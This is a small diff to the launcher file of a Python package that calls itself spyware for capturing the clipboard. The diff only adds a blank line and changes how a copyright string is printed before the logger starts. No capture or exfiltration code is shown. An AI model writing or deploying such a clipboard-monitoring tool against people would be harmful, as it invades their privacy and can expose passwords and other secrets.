@@ -5,6 +5,7 @@
 This package implements a SpyWare to capture the clipboard.
 """
 
+
 ###################
 #    This package implements a SpyWare to capture the clipboard.
 #    Copyright (C) 2021, 2022  Maurice Lambert
@@ -48,5 +49,5 @@ try:
 except ImportError:
     from ClipboardLogger import main as clipboardSpy
 
-print(copyright)
+print(__copyright__)
 clipboardSpy()
